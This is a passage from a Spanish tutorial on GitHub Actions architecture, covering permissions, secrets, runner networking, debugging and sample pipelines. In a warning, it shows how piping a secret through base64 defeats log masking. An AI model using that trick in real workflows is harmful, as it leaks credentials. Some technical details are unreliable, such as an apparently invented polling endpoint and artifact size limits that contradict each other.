          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}  # Token automático
```

**Permisos por defecto**:
- Leer código: ✅
- Escribir en issues: ✅
- Escribir en PRs: ✅
- Push al repo: ❌ (por defecto)

**Configurar permisos**:
```yaml
permissions:
  contents: write      # Permite push
  issues: read         # Solo lectura de issues
  pull-requests: write # Escribir en PRs

jobs:
  # ...
```

### 9.3 Secretos

**Encriptación**: AES-256 en reposo, TLS en tránsito.

**Enmascaramiento**: GitHub detecta y oculta secrets en logs.

```yaml
steps:
  - name: Usar secreto
    run: |
      echo "Password: ${{ secrets.DB_PASSWORD }}"
      # Logs mostrarán: Password: ***
      
      # NUNCA HAGAS ESTO (bypass del enmascaramiento):
      echo "${{ secrets.DB_PASSWORD }}" | base64
      # Esto expondrá el secreto (en base64 pero visible)
```

### 9.4 Aislamiento de Runners

Cada job en GitHub-hosted runners se ejecuta en una **VM completamente nueva**:

```
Job 1 → VM 10.0.1.100 → Destruida después
Job 2 → VM 10.0.1.101 → Destruida después
Job 3 → VM 10.0.1.102 → Destruida después
```

**No pueden acceder entre sí**:
- Red aislada
- Filesystem independiente
- Procesos independientes

---

## 10. NETWORKING Y COMUNICACIÓN

### Introducción: Conectividad en un Sistema Distribuido

GitHub Actions es un **sistema distribuido**: los runners están en máquinas separadas de los servidores de GitHub. Para que funcione, necesitan **comunicarse constantemente**. Entender cómo funciona esta comunicación te ayuda a debuggear problemas de red y optimizar workflows.

**El problema de la comunicación**

```
Desafío:
┌──────────────┐                    ┌──────────────┐
│   GitHub     │   Internet        │    Runner    │
│  (servidor)  │ ←─────────────→  │  (cualquier  │
│              │                    │   lugar)     │
└──────────────┘                    └──────────────┘

Preguntas:
❓ ¿Cómo sabe el runner que hay un job?
❓ ¿Cómo envía logs en tiempo real?
❓ ¿Qué pasa si pierde conexión?
❓ ¿Puede acceder a servicios externos?
❓ ¿Puede acceder a tu red interna?
```

**La arquitectura de comunicación**

GitHub Actions usa múltiples canales de comunicación:

```
CANAL 1: Runner → GitHub (Polling)
  Propósito: Obtener nuevos jobs
  Frecuencia: Cada ~5 segundos
  Protocolo: HTTPS
  Dirección: Saliente (runner inicia)

CANAL 2: Runner → GitHub (Logs)
  Propósito: Enviar logs en tiempo real
  Frecuencia: Continuo (streaming)
  Protocolo: HTTPS/WebSocket
  Tamaño: Línea por línea

CANAL 3: Runner → GitHub (Artifacts)
  Propósito: Subir archivos
  Frecuencia: Al completar job
  Protocolo: HTTPS multipart
  Tamaño: Hasta 10 GB

CANAL 4: Runner → Internet (Egress)
  Propósito: Descargar dependencias, actions
  Frecuencia: Según necesidad del workflow
  Protocolo: HTTP/HTTPS/SSH/etc.
  Restricciones: Ninguna (full internet)

CANAL 5: Internet → Runner (Ingress)
  Propósito: Recibir webhooks, callbacks
  Frecuencia: Raramente
  Restricciones: ⚠️ GitHub-hosted NO permite
```

**¿Por qué no hay conexión directa GitHub → Runner?**

Esto sorprende a muchos:

```
❌ GitHub NO puede iniciar conexión al runner
✓ Runner inicia conexión a GitHub (polling)

¿Por qué?
1. Runners pueden estar detrás de firewalls/NAT
2. Runners pueden no tener IP pública
3. Seguridad: Runner "tira" jobs, no GitHub "empuja"

Implicación:
→ Workflows no pueden recibir webhooks directamente
→ Necesitas servicios intermediarios si requieres ingress
```

**El proceso de polling**

```
Loop infinito del runner:

1. Runner: "¿Hay jobs para mí?"
   ↓
   GET https://api.github.com/actions/runs/queue
   Headers: Authorization: Bearer <runner-token>
   ↓
2. GitHub: "No" o "Sí, ejecuta job 12345"
   ↓
3. Si hay job:
   - Descargar workflow definition
   - Descargar actions necesarias
   - Ejecutar steps
   - Streaming de logs
   - Subir resultados
   ↓
4. Esperar 5 segundos
   ↓
5. Repetir desde paso 1

Este loop corre 24/7 mientras el runner está activo
```

**Acceso a internet: Full outbound**

Los runners tienen acceso completo a internet:

```
✓ Pueden: npm install (npmjs.com)
✓ Pueden: pip install (pypi.org)
✓ Pueden: git clone github.com
✓ Pueden: docker pull (docker.io)
✓ Pueden: curl cualquier API pública
✓ Pueden: conectar a bases de datos públicas

✗ NO pueden (GitHub-hosted):
  - Recibir conexiones entrantes
  - Ser servidores HTTP accesibles desde fuera
  - Tener IP estática/predecible
```

**Services containers: Networking local**

Los workflows pueden levantar servicios (bases de datos, Redis):

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:14
        ports:
          - 5432:5432
    steps:
      - run: |
          # Postgres accesible en localhost:5432
          psql -h localhost -U postgres
```

**Cómo funciona:**

```
Runner (Docker):
┌────────────────────────────────────┐
│ Network: github_network            │
│                                    │
│  ┌──────────────┐  ┌────────────┐ │
│  │ Job Container│  │ postgres   │ │
│  │              │→ │ :5432      │ │
│  │ localhost    │  │            │ │
│  └──────────────┘  └────────────┘ │
└────────────────────────────────────┘

Job container puede acceder a postgres
pero NO desde internet externo
```

**Latencia y optimización**

La comunicación tiene latencia:

```
Operación típica:
─────────────────────────────────────
Descarg action (actions/checkout): ~2s
  → GitHub CDN
  → Geográficamente distribuido

Subir logs (cada línea): <100ms
  → Streaming en background
  → No bloquea ejecución

Subir artifact (100 MB): ~20-30s
  → Compresión automática
  → Upload paralelo

Polling (cada 5s): ~50-100ms
  → Keepalive connection
  → Minimal overhead
```

**Optimizaciones:**

```
1. Cache de actions:
   GitHub cachea actions populares cerca de runners
   actions/checkout: Casi instantáneo

2. Compresión de artifacts:
   Compresión gzip automática
   Reduce tiempos de upload

3. Parallel uploads:
   Artifacts grandes se suben en chunks paralelos
   Maximiza bandwidth

4. CDN para downloads:
   Actions, packages están en CDN global
   Baja latencia desde cualquier región
```

**Problemas comunes de red**

```
ERROR: "Failed to download action"
Causa: Red lenta o inestable
Solución: Retry automático (GitHub lo hace)

ERROR: "Connection timeout to external API"
Causa: API externa no responde
Solución: Implementar retry en tu código

ERROR: "Cannot connect to localhost:3000"
Causa: Service container no levantó
Solución: Verificar health check

ERROR: "Runner lost connection"
Causa: Runner perdió internet
Solución: Workflow se marca como "failed"
           Job se puede re-asignar a otro runner
```

**Self-hosted runners: Consideraciones de red**

Si usas self-hosted runners, necesitas:

```
REQUISITOS SALIENTES (Egress):
✓ HTTPS (443) a api.github.com
✓ HTTPS (443) a github.com
✓ HTTPS (443) a *.actions.githubusercontent.com
✓ HTTP/HTTPS a internet (para dependencies)

FIREWALL:
→ Permitir saliente a dominios de GitHub
→ NO necesitas abrir puertos entrantes
→ NAT/proxy son compatibles

PROXY:
→ Runners soportan HTTP_PROXY
→ Configurar en variables de entorno
→ Certificados custom soportados
```

**¿Por qué entender networking importa?**

1. **Debugging**: Entiendes errores de conexión
2. **Optimización**: Reduces tiempos de download/upload
3. **Seguridad**: Sabes qué puede acceder el runner
4. **Self-hosted**: Configuras firewall correctamente
5. **Services**: Usas bases de datos locales eficientemente

El networking de GitHub Actions es simple por fuera (todo "funciona"), pero conocer los detalles te hace experto en troubleshooting.

---

### 10.1 Comunicación Runner ↔ GitHub

```
┌─────────────┐                          ┌──────────────┐
│   RUNNER    │                          │  GITHUB.COM  │
│             │                          │              │
│ Polling:    │  ← Cada 5 segundos →    │              │
│ "¿Hay jobs?"│ ──────────────────────→ │ Job Queue    │
│             │ ←──────────────────────  │              │
│             │  "Sí, ejecuta job 123"  │              │
│             │                          │              │
│ Durante     │                          │              │
│ ejecución:  │                          │              │
│ - Logs      │ ──────────────────────→ │              │
│ - Status    │ ──────────────────────→ │              │
│ - Artifacts │ ──────────────────────→ │              │
│             │                          │              │
│ Al terminar:│                          │              │
│ - Resultado │ ──────────────────────→ │              │
│ - Exit code │ ──────────────────────→ │              │
└─────────────┘                          └──────────────┘
```

### 10.2 Acceso a Internet desde el Runner

Los runners tienen **acceso completo a internet**:

```yaml
steps:
  - run: curl https://api.example.com/data
    # ✅ Funciona - puede hacer requests HTTP
  
  - run: pip install requests
    # ✅ Funciona - descarga desde PyPI
  
  - run: git clone https://github.com/usuario/repo
    # ✅ Funciona - puede clonar repos públicos
```

**Limitaciones**:
- No puedes recibir conexiones entrantes (no hay IP pública estable)
- No puedes hacer tunneling complejo
- Algunos servicios pueden bloquear IPs de Azure (donde están los runners)

### 10.3 Comunicación entre Steps

Dentro del mismo job, los steps comparten:

1. **Filesystem**:
```yaml
steps:
  - run: echo "hola" > archivo.txt
  - run: cat archivo.txt  # Funciona - mismo filesystem
```

2. **Variables de entorno** (si se exportan):
```yaml
steps:
  - run: echo "MI_VAR=valor" >> $GITHUB_ENV
  - run: echo "$MI_VAR"  # Imprime: valor
```

3. **Directorio de trabajo**:
```yaml
steps:
  - run: cd /tmp && pwd  # /tmp
  - run: pwd             # /home/runner/work/repo/repo (reset)
  # Cada step comienza en el workspace por defecto
```

---

## 11. DEBUGGING Y TROUBLESHOOTING

### 11.1 Logs Detallados

Activar debug logging:

```yaml
# En el repo: Settings → Secrets → New repository secret
# Nombre: ACTIONS_STEP_DEBUG
# Valor: true
```

O establecer en el workflow:
```yaml
env:
  ACTIONS_STEP_DEBUG: true
```

### 11.2 Runner Diagnostic Logs

Ver logs del sistema:
```yaml
steps:
  - name: Diagnóstico
    run: |
      echo "=== SISTEMA ==="
      uname -a
      
      echo "=== VARIABLES DE ENTORNO ==="
      env | sort
      
      echo "=== ESPACIO EN DISCO ==="
      df -h
      
      echo "=== MEMORIA ==="
      free -h
      
      echo "=== DIRECTORIO ACTUAL ==="
      pwd
      ls -la
      
      echo "=== HERRAMIENTAS ==="
      git --version
      node --version
      python --version
```

### 11.3 Ver Contextos Completos

```yaml
steps:
  - name: Dump contextos
    run: |
      echo "GITHUB:"
      echo '${{ toJSON(github) }}'
      
      echo "ENV:"
      echo '${{ toJSON(env) }}'
      
      echo "JOB:"
      echo '${{ toJSON(job) }}'
      
      echo "RUNNER:"
      echo '${{ toJSON(runner) }}'
```

---

## 12. CASOS DE USO TÉCNICOS

### 12.1 Pipeline de CI/CD Completo

```yaml
name: Full CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  NODE_VERSION: '18'

jobs:
  # Job 1: Validaciones rápidas
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
      - run: npm ci
      - run: npm run lint
  
  # Job 2: Tests (matrix para múltiples versiones)
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [16, 18, 20]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test
  
  # Job 3: Build (solo si lint y test pasaron)
  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.package.outputs.version }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
      - run: npm ci
      - run: npm run build
      
      - name: Obtener versión
        id: package
        run: echo "version=$(node -p "require('./package.json').version")" >> $GITHUB_OUTPUT
      
      - name: Subir artefacto
        uses: actions/upload-artifact@v4
        with:
          name: dist-${{ steps.package.outputs.version }}
          path: dist/
  
  # Job 4: Deploy (solo en main)
  deploy:
    needs: build
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Descargar artefacto
        uses: actions/download-artifact@v4
        with:
          name: dist-${{ needs.build.outputs.version }}
      
      - name: Deploy a producción
        run: |
          echo "Deploying version ${{ needs.build.outputs.version }}"
          # Comandos de deploy...
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

**Flujo de ejecución**:
```
Push a main
    ↓
GitHub detecta evento "push"
    ↓
Evalúa "on: push" → Ejecuta workflow
    ↓
┌─────────┐  ┌─────────┐
│  lint   │  │  test   │  ← Ejecutan en PARALELO
│         │  │ (6 jobs)│     (no tienen "needs")
└────┬────┘  └────┬────┘
     └────────────┘
            ↓
       ┌─────────┐
       │  build  │  ← Espera a que lint y test terminen
       └────┬────┘
            ↓
       ┌─────────┐
       │ deploy  │  ← Solo si es push a main
       └─────────┘
```

### 12.2 Workflow Reutilizable

**Archivo: .github/workflows/reusable-test.yml**
```yaml
name: Reusable Test Workflow

on:
  workflow_call:
    inputs:
      node-version:
        required: true
        type: string
      test-command:
        required: false
        type: string
        default: 'npm test'
    outputs:
      coverage:
        description: "Test coverage percentage"
        value: ${{ jobs.test.outputs.coverage }}
    secrets:
      npm-token:
        required: false

jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      coverage: ${{ steps.coverage.outputs.percentage }}
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
      
      - run: npm ci
        env:
          NPM_TOKEN: ${{ secrets.npm-token }}
      
      - run: ${{ inputs.test-command }}
      
      - name: Calcular coverage
        id: coverage
        run: |
          COVERAGE=$(npm run coverage:summary | grep -oP '\d+(?=%)')
          echo "percentage=$COVERAGE" >> $GITHUB_OUTPUT
```

**Uso del workflow reutilizable:**
```yaml
name: CI

on: [push, pull_request]

jobs:
  test-node-16:
    uses: ./.github/workflows/reusable-test.yml
    with:
      node-version: '16'
      test-command: 'npm test -- --coverage'
    secrets:
      npm-token: ${{ secrets.NPM_TOKEN }}
  
  test-node-18:
    uses: ./.github/workflows/reusable-test.yml
    with:
      node-version: '18'
  
  report:
    needs: [test-node-16, test-node-18]
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Node 16 coverage: ${{ needs.test-node-16.outputs.coverage }}%"
          echo "Node 18 coverage: ${{ needs.test-node-18.outputs.coverage }}%"
```

---

## 13. PREGUNTAS FRECUENTES TÉCNICAS

### ¿Cómo sabe GitHub qué workflow ejecutar?

1. Usuario hace una acción (push, open PR, etc.)
2. GitHub genera un evento con tipo (push, pull_request, etc.)
3. GitHub busca TODOS los archivos en `.github/workflows/*.yml`
4. Para cada archivo, lee el campo `on:`
5. Si el evento coincide con el `on:`, ejecuta ese workflow
6. Puede ejecutar múltiples workflows para un mismo evento

### ¿Los workflows se ejecutan siempre?

NO. Solo si:
- El evento coincide con `on:`
- Los filtros (branches, paths) coinciden
- El repo tiene Actions habilitado
- No hay errores de sintaxis en el YAML

### ¿Puedo ejecutar un workflow manualmente?

SÍ, con `workflow_dispatch`:
```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Environment to deploy'
        required: true
        type: choice
        options:
          - dev
          - staging
          - production

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to ${{ inputs.environment }}"
```

### ¿Cuánto cuestan las GitHub Actions?

**Repositorios públicos**: Gratis e ilimitado

**Repositorios privados**:
- Free plan: 2,000 minutos/mes
- Pro: 3,000 minutos/mes
- Team: 10,000 minutos/mes
- Enterprise: 50,000 minutos/mes

**Multiplicadores por OS**:
- Linux: 1x
- Windows: 2x
- macOS: 10x

Ejemplo: 1 minuto de macOS = 10 minutos consumidos

### ¿Puedo usar Docker en GitHub Actions?

SÍ:
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:18-alpine
    steps:
      - run: node --version  # Ejecuta dentro del container
```

O ejecutar containers como servicios:
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:14
        env:
          POSTGRES_PASSWORD: postgres
        ports:
          - 5432:5432
    steps:
      - run: psql -h localhost -U postgres -c "SELECT 1"
```

### ¿Cómo evito que se ejecute en forks?

```yaml
jobs:
  deploy:
    if: github.repository == 'mi-usuario/mi-repo'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Solo en mi repo"
```

---

## 14. LÍMITES Y CUOTAS

### Límites Técnicos

| Recurso | Límite |
|---------|--------|
| Duración máxima de job | 6 horas |
| Duración máxima de workflow | 72 horas |
| Jobs concurrentes (Free) | 20 |
| Jobs concurrentes (Pro) | 40 |
| Jobs en cola | 500 |
| Tamaño de artifact | 2 GB por archivo |
| Tamaño de cache | 10 GB por repositorio |
| Workflows en un repo | Ilimitado |

### Límites de API

- 1,000 requests por hora por repositorio
- 100 MB de logs por step
- 1,000 requests por minuto (GitHub API desde Actions)

---

## 15. COMPARACIÓN CON OTROS CI/CD

| Característica | GitHub Actions | Jenkins | GitLab CI | CircleCI |
|----------------|----------------|---------|-----------|----------|
| Hosting | GitHub (cloud) | Self-hosted | GitLab (cloud/self) | CircleCI (cloud) |
| Configuración | YAML | Groovy/DSL | YAML | YAML |
| Runners | Managed/Self | Agents | Managed/Self | Executors |
| Marketplace | Sí (actions) | Plugins | No | Orbs |
| Integración GitHub | Nativa | Vía webhooks | Vía webhooks | Vía webhooks |

---

## 16. RECURSOS ADICIONALES

### Documentación Oficial
- [GitHub Actions Docs](https://docs.github.com/actions)
- [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [Events Reference](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows)

### Herramientas
- [act](https://github.com/nektos/act) - Ejecutar actions localmente
- [actionlint](https://github.com/rhysd/actionlint) - Linter para workflows

### Marketplace
- [GitHub Actions Marketplace](https://github.com/marketplace?type=actions)

---

## CONCLUSIÓN

GitHub Actions es un sistema complejo con múltiples capas:

1. **Event System**: Detecta cambios en GitHub
2. **Workflow Engine**: Procesa YAML y toma decisiones
3. **Job Scheduler**: Asigna trabajos a runners
4. **Runners**: Ejecutan los comandos reales
5. **Storage**: Guarda artifacts, cache, logs

**La clave para dominarlo**: Entender que es un sistema **event-driven** y **distribuido**, donde cada componente tiene un rol específico en el ciclo de vida de la ejecución.

Cada vez que uses `${{ github.event_name }}`, ahora sabes:
- Que es un EVENTO generado por GitHub.com
- Que el servidor detectó una acción (push, PR, etc.)
- Que creó un payload JSON con toda la info
- Que ese payload está disponible en el contexto `github.event`
- Que se evaluó ANTES de enviar al runner

**Esto es conocimiento arquitectónico, no solo features** ✅

